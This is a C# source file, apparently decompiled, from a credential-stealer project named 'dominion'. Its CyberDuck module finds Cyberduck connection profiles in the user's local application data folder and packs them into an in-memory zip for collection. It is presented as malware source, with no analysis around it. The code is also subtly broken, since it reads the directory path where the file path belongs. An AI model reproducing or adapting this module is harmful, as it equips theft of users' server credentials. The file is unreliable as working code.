using dominion.src.dominion.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace dominion.src.dominion.Stealer.Applications
{
    public class CyberDuck : ITarget
    {
        // Token: 0x06000191 RID: 401 RVA: 0x0000D868 File Offset: 0x0000BA68
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
            if (!Directory.Exists(path))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "CyberDuck";
            foreach (string text in Directory.GetFiles(path))
            {
                if (text.EndsWith(".cyberduckprofile"))
                {
                    string text2 = "CyberDuck\\" + Path.GetFileName(text);
                    zip.AddFile(text2, File.ReadAllBytes(path));
                    counterApplications.Files.Add(text + " => " + text2);
                }
            }
            counter.Applications.Add(counterApplications);
        }
    }
}
